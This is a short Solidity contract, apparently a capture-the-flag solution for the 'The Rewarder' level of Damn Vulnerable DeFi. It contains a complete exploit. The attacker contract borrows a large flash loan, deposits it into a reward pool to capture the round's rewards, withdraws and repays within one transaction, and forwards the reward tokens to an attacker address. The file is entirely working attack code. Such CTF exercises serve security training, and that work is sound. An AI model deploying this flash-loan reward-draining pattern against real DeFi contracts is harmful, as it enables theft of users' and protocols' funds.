pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "contracts/the-rewarder/FlashLoanerPool.sol";
import "contracts/the-rewarder/TheRewarderPool.sol";


contract RewarderAttacker {
    using Address for address payable;
    
    IERC20 public immutable damnValuableToken;

    TheRewarderPool rewarder;
    FlashLoanerPool loaner;
    RewardToken rTok;

    constructor(address tokenAddress) {
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress);
    }

    function exploit(FlashLoanerPool _loaner, TheRewarderPool _rewarder, RewardToken rToken, address atker) external {
        rewarder = _rewarder;
        loaner = _loaner;
        rTok = rToken;
        _loaner.flashLoan(1000000*10**18);
        rTok.transfer(atker, rTok.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 ammount) external {
        damnValuableToken.approve(address(rewarder), ammount);
        rewarder.deposit(ammount);
        rewarder.withdraw(ammount);
        damnValuableToken.transfer(address(loaner), ammount);
    }

}
